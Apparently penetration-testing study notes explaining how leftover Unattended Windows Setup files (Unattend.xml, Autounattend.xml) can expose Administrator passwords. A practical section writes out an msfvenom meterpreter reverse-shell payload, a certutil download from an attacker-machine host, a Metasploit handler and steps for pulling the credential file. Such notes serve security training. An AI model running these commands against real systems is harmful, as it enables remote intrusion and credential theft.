> Windows can automate a variety of repetitive tasks, such as the mass rollout or
  installation of Windows on many systems.
> This is typically done through the use of the Unattended Windows Setup utility,
  which is used to automate the mass installation/deployment of Windows on systems.
> This tool utilizes configuration files that contain specific configurations and user
  account credentials, specifically the Administrator accountâ€™s password.
> If the Unattended Windows Setup configuration files are left on the target
  system after installation, they can reveal user account credentials that can be
  used by attackers to authenticate with Windows target legitimately.
  
Unattended Windows Setup:
> The Unattended Windows Setup utility will typically utilize one of the following
  configuration files that contain user account and system configuration information:
  > C:\Windows\Panther\Unattend.xml
  > C:\Windows\Panther\Autounattend.xml
> As a security precaution, the passwords stored in the Unattended Windows
  Setup configuration file may be encoded in base64.
  
Passwords in Windows Configuration Files Practical:
> gain access to the victim machine
  > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<local IP> LPORT=<local Port> -f exe > payload.exe
  > python -m SimpleHTTPServer 80         // simple http server with python
  > certutil -urlcache -f http://<attacker-machine>/payload.exe payload.exe       // download files on windows with certutils
  > msfconsole -q
    > use exploit/multi/handler
      > set LHOST <local IP>

      > set payload windows/x64/meterpreter/reverse_tcp
      > run
  > run payload.exe on windows
  
> in meterpreter session:
  > search -f Unattend.xml            // search for Unattend.xml on current Folder
  > cd to C:\\Windows\\Panther\\
  > download Unattend.xml
> local on attacker-machine 
  > cat unattended.xml
    > search for autologon
